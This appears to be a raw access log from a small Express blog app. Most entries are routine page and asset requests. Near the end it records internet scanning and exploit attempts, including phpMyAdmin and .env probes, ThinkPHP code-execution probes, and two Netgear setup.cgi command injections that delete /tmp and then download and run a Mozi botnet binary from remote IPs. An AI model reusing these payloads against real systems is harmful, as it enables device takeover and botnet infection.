[0mGET / [36m304 [0m10.448 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.450 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.435 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.473 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.724 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.421 ms - -[0m
[0mGET / [36m304 [0m1.182 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.492 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.401 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.275 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.312 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.295 ms - -[0m
[0mGET /blogList [36m304 [0m2.372 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.504 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.598 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.588 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.593 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.587 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.305 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.881 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.865 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.166 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.164 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.140 ms - -[0m
[0mGET / [36m304 [0m0.930 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.463 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.456 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.435 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.436 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.371 ms - -[0m
Port 3000 is already in use
[0mGET / [36m304 [0m1.271 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.404 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.374 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.161 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.159 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.138 ms - -[0m
Port 3000 is already in use
[0mGET / [36m304 [0m2.062 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.494 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.358 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.191 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.223 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.210 ms - -[0m
[0mGET / [36m304 [0m1.029 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.428 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.479 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.478 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.438 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.437 ms - -[0m
[0mGET / [36m304 [0m0.998 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.440 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.369 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.082 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.157 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.197 ms - -[0m
[0mGET /blogList [36m304 [0m1.110 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.783 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.787 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m0.327 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m0.760 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.721 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.146 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.435 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m2.156 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.134 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.075 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.385 ms - -[0m
[0mGET / [36m304 [0m0.952 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.427 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.354 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.066 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.058 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.046 ms - -[0m
[0mGET / [32m200 [0m1.067 ms - 1971[0m
[0mGET /stylesheets/style.css [32m200 [0m1.684 ms - 493[0m
[0mGET /javascripts/jquery.min.js [32m200 [0m1.677 ms - 72380[0m
[0mGET /javascripts/popper.min.js [32m200 [0m1.237 ms - 21233[0m
[0mGET /javascripts/bootstrap.min.js [32m200 [0m1.078 ms - 60044[0m
[0mGET /stylesheets/bootstrap.min.css [32m200 [0m3.948 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.773 ms - 963[0m
[0mGET /blogAdd [32m200 [0m0.992 ms - 1918[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m0.466 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.186 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.166 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.156 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m0.335 ms - -[0m
[0mGET /blogList [32m200 [0m1.970 ms - 1914[0m
[0mGET /stylesheets/style.css [36m304 [0m0.453 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m1.453 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m1.464 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m1.489 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.471 ms - -[0m
[0mGET / [36m304 [0m0.961 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.469 ms - -[0m
[0mGET /javascripts/popper.min.js [36m304 [0m4.179 ms - -[0m
[0mGET /stylesheets/bootstrap.min.css [36m304 [0m4.174 ms - -[0m
[0mGET /javascripts/jquery.min.js [36m304 [0m4.156 ms - -[0m
[0mGET /javascripts/bootstrap.min.js [36m304 [0m1.553 ms - -[0m
[0mGET / [32m200 [0m0.939 ms - 1971[0m
[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m2.138 ms - 963[0m
[0mGET / [32m200 [0m0.900 ms - 1971[0m
[0mGET / [32m200 [0m0.877 ms - 1971[0m
[0mGET / [32m200 [0m0.928 ms - 1971[0m
[0mHEAD /robots.txt [33m404 [0m0.948 ms - 963[0m
[0mGET / [32m200 [0m0.921 ms - 1971[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m18.665 ms - 963[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.988 ms - 963[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.534 ms - 963[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.933 ms - 963[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m0.944 ms - 963[0m
[0mGET /MyAdmin/scripts/setup.php [33m404 [0m0.928 ms - 963[0m
[0mGET /t [33m404 [0m0.992 ms - 963[0m
[0mGET / [32m200 [0m0.895 ms - 1971[0m
[0mGET / [32m200 [0m0.703 ms - 1971[0m
[0mGET http://example.com/ [32m200 [0m0.946 ms - 1971[0m
[0mGET / [32m200 [0m1.614 ms - 1971[0m
[0mGET / [32m200 [0m0.928 ms - 1971[0m
[0mGET / [32m200 [0m0.866 ms - 1971[0m
[0mGET /ReportServer [33m404 [0m0.940 ms - 963[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.926 ms - 963[0m
[0mGET / [32m200 [0m0.918 ms - 1971[0m
[0mGET / [32m200 [0m0.859 ms - 1971[0m
[0mGET / [32m200 [0m0.955 ms - 1971[0m
[0mGET / [32m200 [0m0.707 ms - 1971[0m
[0mGET /app/.env [33m404 [0m0.846 ms - 963[0m
[0mPOST /app [33m404 [0m25.428 ms - 963[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.99.207.85:46136/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.966 ms - 963[0m
[0mGET /hudson [33m404 [0m1.949 ms - 963[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.948 ms - 963[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m0.961 ms - 963[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.855 ms - 1971[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.895 ms - 1971[0m
[0mGET / [32m200 [0m0.828 ms - 1971[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.927 ms - 963[0m
[0mHEAD /MjZL [33m404 [0m0.947 ms - 963[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://121.61.97.132:51112/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.993 ms - 963[0m
[0mGET / [32m200 [0m0.901 ms - 1971[0m
[0mGET / [32m200 [0m0.865 ms - 1971[0m
[0mHEAD / [32m200 [0m0.833 ms - 1971[0m
[0mGET / [32m200 [0m1.015 ms - 1971[0m
